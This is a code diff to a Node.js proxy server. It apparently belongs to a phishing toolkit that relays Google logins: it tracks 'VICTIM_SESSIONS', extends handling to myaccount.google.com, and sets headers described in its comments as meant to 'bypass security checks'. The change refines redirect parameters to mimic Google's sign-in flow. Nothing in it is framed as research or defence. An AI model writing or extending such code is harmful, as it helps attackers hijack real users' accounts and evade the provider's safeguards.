@@ -86,7 +86,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     if (url === '/g' || url === '/google') {
         // Redirect to Google login URL
         clientResponse.writeHead(302, { 
-            Location: `/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2Fsignin%2Fv2%2Fidentifier` 
+            Location: `/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2Fsignin%2Fv2%2Fidentifier%3FflowName%3DGlifWebSignIn%26flowEntry%3DServiceLogin` 
         });
         clientResponse.end();
         return;
@@ -1491,7 +1491,8 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     
     // Special handling for Google accounts
     if (VICTIM_SESSIONS[currentSession].hostname === 'accounts.google.com' || 
-        VICTIM_SESSIONS[currentSession].hostname === 'www.google.com') {
+        VICTIM_SESSIONS[currentSession].hostname === 'www.google.com' ||
+        VICTIM_SESSIONS[currentSession].hostname === 'myaccount.google.com') {
         // Google requires very specific headers to bypass security checks
         
         // Critical: Set proper Chrome user-agent with all details
